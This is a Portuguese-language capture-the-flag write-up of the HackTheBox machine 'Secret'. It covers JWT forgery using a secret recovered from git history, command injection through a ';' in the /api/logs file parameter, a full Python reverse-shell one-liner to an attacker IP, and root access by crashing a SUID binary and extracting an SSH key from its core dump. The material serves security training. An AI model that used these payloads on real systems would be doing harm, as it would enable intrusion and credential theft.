# Secret

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux |
| **Técnicas** | JWT Token Manipulation, Git History, RCE, Binary Crash Analysis, CoreDump |
| **Link HTB** | [https://app.hackthebox.com/machines/Secret](https://app.hackthebox.com/machines/Secret) |

## Resumo

Máquina Linux com aplicação web que fornece código-fonte em repositório Git. Histórico do Git revela TOKEN_SECRET usado para JWT. Manipulação de token JWT permite RCE através de endpoint `/api/logs`. Escalação via crash de binário SUID e análise de CoreDump para extrair chave SSH.

## Enumeration/Scanning

### Source Code Analysis

Site disponibiliza código-fonte da aplicação. Analisando o código, encontramos endpoint `/api/logs` com RCE potencial, mas requer permissões de administrador.

## Exploitation

### Git History Analysis

O código-fonte é um repositório Git. Explorando commits anteriores:

```bash
git log
git show [commit-hash]
```

**Descoberta:** Commit passado revela `TOKEN_SECRET` usado para geração de tokens JWT.

### JWT Token Manipulation

Com o `TOKEN_SECRET`, podemos forjar um token JWT com username `theadmin`:

```javascript
const token = jwt.sign({ username: 'theadmin' }, TOKEN_SECRET);
```

### RCE via /api/logs

Endpoint vulnerável permite execução de comandos via parâmetro de arquivo:

```bash
curl -H "auth-token: [JWT_TOKEN]" "http://[IP]/api/logs?file=;[COMMAND]"
```

Payload para reverse shell (netcat não suportava `-e`):

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.47",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Shell obtido:** www-data

```bash
cat /home/*/user.txt
```

**User Flag:** ✓

## Privilege Escalation

### Finding SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

**Binário suspeito encontrado:** `/opt/count` (SUID root)

### Binary Analysis

O binário `/opt/count` conta caracteres em arquivos, lendo conteúdo na memória. Como tem permissão root, podemos ler `/root/root.txt`.

Executando o binário e crashando-o durante execução:

```bash
/opt/count /root/root.txt &
kill -BUS [PID]
```

### CoreDump Analysis

Usando `apport-unpack` e `strings` para analisar o CoreDump:

```bash
apport-unpack /var/crash/*.crash /tmp/crash
strings /tmp/crash/CoreDump | grep -A 50 "BEGIN"
```

**Descoberta:** Chave SSH privada do root no dump de memória.

### SSH as Root

```bash
ssh -i root_key root@[IP]
cat /root/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **Git history** pode conter secrets como tokens e credenciais - sempre verificar commits anteriores
- **JWT tokens** podem ser forjados se o secret é conhecido
- RCE em endpoints API frequentemente requer bypass de autenticação/autorização
- **Binary crashes** podem expor informações sensíveis através de CoreDumps
- `apport-unpack` e `strings` são ferramentas úteis para análise de crashes

---

*Writeup by kp*
